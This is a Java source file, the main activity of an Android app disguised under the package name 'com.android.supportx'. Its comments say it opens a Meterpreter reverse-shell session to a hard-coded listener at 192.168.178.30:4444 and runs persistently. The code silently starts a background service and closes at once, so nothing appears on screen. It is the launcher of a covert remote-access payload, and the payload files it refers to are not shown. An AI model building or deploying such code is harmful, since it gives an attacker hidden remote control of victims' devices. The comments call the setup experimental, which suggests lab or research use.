package com.android.supportx;

import android.content.Intent;
import android.os.Bundle;


import android.app.Activity;

public class MainActivity extends Activity {

    // This application is designed to open a meterpreter session to the following ip-port
    // LHOST = 192.168.178.30:4444 to modify this, open Payload.java
    // This application runs forever ( "android:persistent=true" ). This SHOULD NOT BE TRUE for any application, except system apps.
    // Has been set to true for experimental purposes, check AndroidManifest if you want to disable this

        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            Intent mis = new Intent(this, Svc.class);
            this.startService(mis);
            finish();
        }
    }




